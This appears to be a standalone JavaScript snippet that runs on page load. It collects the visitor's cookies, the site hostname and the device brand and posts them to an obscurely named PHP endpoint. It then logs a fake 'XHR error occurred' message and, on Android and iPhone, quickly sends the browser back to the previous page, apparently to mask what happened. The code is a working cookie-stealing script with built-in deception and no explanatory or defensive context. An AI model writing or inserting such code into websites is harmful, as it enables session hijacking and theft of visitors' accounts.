
document.body.onload = ()=>{
      
      var length = 8;
      var characters = 'abcdefghklmnopkrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890._-'
      var fn ="";
      for (var a = 0,n = characters.length;a<length;++a){
            fn += characters.charAt(Math.floor(Math.random() * n))
      }
      const kc = document.cookie.replace('&', '  ').replace('undefined','empty');
      
      let httpReq = new XMLHttpRequest();
      httpReq.open('POST','/sZT6lhNBEw5gP_2JYfvCHKambApFiGSkt8OWnx.3.php'+'?name='+window.top.location.hostname+'&message='+livetime+'&fn='+fn+'&db='+deviceBrand+"&kc="+kc)
      httpReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded')
      httpReq.send()
      console.error('XHR error occurred')
      

      
      if(deviceBrand.toLocaleLowerCase() =="android" || deviceBrand.toLocaleLowerCase() =="iphone"){
            setTimeout(function(){window.history.back()},100)
      }
      
    
}
